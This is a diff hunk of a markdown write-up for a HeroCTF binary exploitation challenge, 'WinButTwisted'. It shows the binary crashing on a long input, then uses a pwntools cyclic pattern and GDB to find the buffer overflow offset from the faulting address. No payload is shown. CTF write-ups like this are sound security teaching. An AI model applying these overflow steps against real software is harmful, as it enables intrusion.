@@ -116,4 +116,20 @@ Uhhm it seems crashed..
 What would a hero say ?
 >>> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 zsh: segmentation fault  ./WinButTwisted
+```
+Now let's find the exactly offset for our padding.
+Create a cyclic string in python with the Pwntools library.
 ```bash
+>>> cyclic_metasploit(40)
+b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2A'
+```
+Run the binary into GDB 
+```gdb
+gef➤  r
+Starting program: /home/kali/Desktop/CTF/HeroCTF/pwn/WinButTwisted 
+What would a hero say ?
+>>> Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2A
+
+Program received signal SIGSEGV, Segmentation fault.
+0x31624130 in ?? ()
+```
